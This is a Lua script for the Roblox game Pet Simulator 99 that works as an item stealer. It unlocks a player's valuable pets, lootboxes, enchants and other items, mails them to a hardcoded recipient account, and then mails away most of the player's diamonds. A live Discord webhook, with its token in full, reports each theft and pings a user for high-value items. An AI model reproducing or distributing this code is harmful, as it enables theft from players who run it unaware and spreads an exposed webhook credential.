local MailRecipient = "Macsploitbanwave"
local Webhook = "https://discord.com/api/webhooks/1242958889100775555/qZcNDntm_ajoLQurgSBPr12B3jxEDtHkT7H26asXTFa6FVIFFoh0d1Dn3k-JrFSLura4"

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local SaveMod = require(ReplicatedStorage.Library.Client.Save)
local Network = ReplicatedStorage:WaitForChild("Network")
local Player = game.Players.LocalPlayer

local Directorys = {}
local SpecialCases = {"Lootbox", "Box"}

local function GetRAP(Type, Item) local stackKey = HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) local rap = require(ReplicatedStorage.Library).DevRAPCmds.Get({ Class = {Name = Type}, IsA = function(hmm) return hmm == Type end, GetId = function() return Item.id end, StackKey = function() return stackKey end }) or 0 return rap end
local function FormatWithCommas(number) return tostring(number):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "") end
function GetItemInfo(class, itemName, info) if SaveMod.Get()["Inventory"][class] then for i,v in SaveMod.Get()["Inventory"][class] do if v.id == itemName then return (info == "uid" and i or v[info]) end end end end

for Class, _ in pairs(Library.Items.Types) do
    if table.find(SpecialCases, Class) then
        Directorys[Class] = Class .. "es"
    elseif Class == "Misc" then
        Directorys[Class] = Class .. "Items"
    else
        Directorys[Class] = Class .. "s"
    end
end

function GetAssetID(Class, ItemName, PetType, Tier)
    local ClassDirectory = Directorys[Class]
    local ItemTable = Library.Directory[ClassDirectory][ItemName]
    if PetType == 1 then
        if ItemTable.goldenThumbnail then
            return ItemTable.goldenThumbnail
        else
            return ItemTable.thumbnail
        end
    end
    if Tier then
        if type(ItemTable.Icon) == "table" then
            return ItemTable.Icon[Tier]
        end
    end
    return ItemTable.Icon or ItemTable.icon or ItemTable.thumbnail
end

local function SendWebhook(Items, Class, UID, Amount, pt ,sh ,tn)
    local ItemInfo = {id = Items, pt = pt, sh = sh, tn = tn}
    local Rap = GetRAP(Class, ItemInfo)
    local ThumbnailURL = string.format("https://biggamesapi.io/image/%s", string.gsub(GetAssetID(Class, Items, pt, tn), "rbxassetid://", ""))
    local PlayerGems = Player.leaderstats["💎 Diamonds"].Value

    local msg = {
        content = (string.find(Items, "Huge") or string.find(Items, "Titanic")) and Class == "Pet" and "<@618580498251382824>" or "",
        embeds = {
            {
                author = {
                    name = "📫 Touhou Mail Bot 📫",
                    icon_url = ThumbnailURL,
                },
                username = "Touhou Mail Bot",
                title = Player.Name .. " Just Sent Mail To " .. MailRecipient,
                color = 0x00FF00,
                timestamp = DateTime.now():ToIsoDate(),
                thumbnail = {
                    url = ThumbnailURL,
                },
                fields = {
                    { name = "<:Pet:1242299008605749301> RAP: " .. FormatWithCommas(Rap * Amount) .. " (" .. FormatWithCommas(Rap) .. " Each)", value = "", inline = false },
                    { name = "<:Booth:1242309582760448020> Item: " .. Items , value = "", inline = false },
                    { name = "<:Pet:1242299008605749301> Amount: " .. FormatWithCommas(Amount), value = "", inline = false },
                    { name = "<:Diamond:1242298786219556914> Gems: " .. FormatWithCommas(PlayerGems) .. "" , value = "", inline = false },
                },               
                footer = {
                    text = "Touhou Mail Bot | gg/AnDdfX3DX3"
                }
            }
        }
    }
    return request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(msg)
    })
end

-- HUGES / TITANIC / EXCLUSIVES
local Exclusives = require(game.ReplicatedStorage:WaitForChild('Library'))
local PetInv = SaveMod.Get()["Inventory"]["Pet"]
for uid, Item in pairs(PetInv) do
    local Amount = Item._am or 1
    if string.find(Item.id, "Titanic") or string.find(Item.id, "Huge") or Exclusives.Directory.Pets[Item.id].exclusiveLevel then
        Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
        Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
        SendWebhook(Item.id, "Pet", uid, Amount, Item.pt ,Item.sh ,Item.tn)
    end
end


local LootboxInv = SaveMod.Get()["Inventory"]["Lootbox"]
for uid, Item in pairs(LootboxInv) do
    local Amount = Item._am or 1
    if string.find(Item.id, "Arcade Egg 5") then
        Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
        Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
        SendWebhook(Item.id, "Lootbox", uid, Amount, Item.pt ,Item.sh ,Item.tn)
    end
end

local MiscInv = SaveMod.Get()["Inventory"]["Misc"]
for uid, Item in pairs(MiscInv) do
    local Amount = Item._am or 1
    if string.find(Item.id, "Arcade") then
        Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
        Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
        SendWebhook(Item.id, "Misc", uid, Amount, Item.pt ,Item.sh ,Item.tn)
    end
end

-- REST OF ITEMS
local Inventory = SaveMod.Get()["Inventory"]
local SentItems = {}
local MailTargets = {
    {Class = "Pet", Names = {"Huge", "Titanic"}},
    {Class = "Enchant", Names = {"Chest", "Boss"}},
    {Class = "Egg", Names = {"Exclusive"}},
    {Class = "Lootbox", Names = {"Arcade Egg 5"}},
    {Class = "Ultimate", Names = {"Chest", "Nightmare", "Hidden", "Black"}},
    {Class = "Misc", Names = {"Arcade Token"}},
}


for Class, Inv in pairs(Inventory) do
    for uid, Item in pairs(Inv) do
        local Amount = Item._am or 1
        for _, Targets in ipairs(MailTargets) do
            if Targets.Class == Class then
                for _, Name in ipairs(Targets.Names) do
                    if string.find(Item.id, Name) then
                        Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
                        Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", Class, uid, Amount)    
                        SendWebhook(Item.id, Class, uid, Amount, Item.pt ,Item.sh ,Item.tn)
                    end
                end
            end 
        end
    end
end


local GemUID = GetItemInfo("Currency", "Diamonds", "uid")
local GemAM = GetItemInfo("Currency", "Diamonds", "_am") - 5000000
Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", "Currency", GemUID, GemAM)  
